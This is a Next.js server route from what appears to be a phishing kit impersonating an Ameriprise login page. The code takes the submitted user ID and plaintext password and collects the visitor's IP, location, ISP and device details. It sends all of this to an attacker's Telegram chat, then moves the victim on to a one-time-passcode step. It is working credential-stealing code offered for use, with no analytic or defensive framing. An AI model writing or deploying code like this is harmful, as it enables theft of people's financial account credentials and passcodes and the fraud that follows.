import { NextResponse } from "next/server";
import { sendToTelegram } from "@/lib/telegram";
import { extractRequestMeta } from "@/lib/request-meta";

export type LoginRequest = {
  action?: string;
  userId?: string;
  password?: string;
  passwordLength?: number;
  source?: string;
  timezone?: string;
};

/** Returns null on success, or a Response to short-circuit with. */
export async function notifyLoginAttempt(req: Request): Promise<Response> {
  try {
    const body = (await req.json().catch(() => null)) as LoginRequest | null;

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return NextResponse.json(
        { error: "Missing TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID" },
        { status: 500 }
      );
    }

    const meta = await extractRequestMeta(req, body?.timezone);

    const action = body?.action === "passkey" ? "passkey" : "password";
    const passwordLength = Number(body?.passwordLength ?? 0);
    const userId = typeof body?.userId === "string" ? body.userId.trim() : "";
    const password = typeof body?.password === "string" ? body.password : "";
    // const source = body?.source === "homepage" ? "homepage" : "client-login";
    const submittedAt = new Date().toISOString();

    const text = [
      "🔐 Login Attempt - AMERIPRISE",
      "━━━━━━━━━━━━━━━━━━",
      `Action: ${action}`,
      `Password Length: ${passwordLength}`,
      `User ID: \`${userId || "(empty)"}\``,
      `Password: \`${password || "(empty)"}\``,
      // `Password: ${password || "(empty)"}`,
      // `Source: ${source}`,
      `Submitted At: ${submittedAt}`,
      "",
      "📍 Location & Network",
      `Location: ${meta.location}`,
      meta.ip ? `IP: ${meta.ip}` : undefined,
      `Timezone: ${meta.timezone}`,
      `ISP: ${meta.isp}`,
      "",
      `📱 Device: ${meta.deviceType} | ${meta.browser} | ${meta.os}`,
      meta.referer ? `🔗 Referrer: ${meta.referer}` : undefined,
      "",
      `🕒 UTC Time: ${new Date().toUTCString()}`,
    ]
      .filter(Boolean)
      .join("\n");

    await sendToTelegram(text);
    return NextResponse.json({ ok: true, next: "/account-access/otp-method" });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}